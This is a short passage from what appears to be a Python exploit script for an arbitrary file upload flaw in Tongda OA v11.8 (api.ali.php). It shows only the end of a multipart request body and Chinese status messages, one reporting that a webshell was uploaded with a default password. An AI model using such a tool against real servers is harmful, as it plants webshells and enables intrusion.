...
--502f67681799b07e4de6b503655f5cae--'''
    ...
    success_msg = now_time() + '[SUCCESS]  漏洞存在 上传webshell成功'
    shell_msg = now_time() + '请修改日期 包含并生成文件默认密码为a:{}'.format(exp_url)
    warning_msg = now_time() + '[WARNING]  通达OA v11.8 api.ali.php 任意文件上传漏洞不存在'
    error_msg = now_time() + '[][ERROR]    无法利用poc请求目标或被目标拒绝请求'
    try:
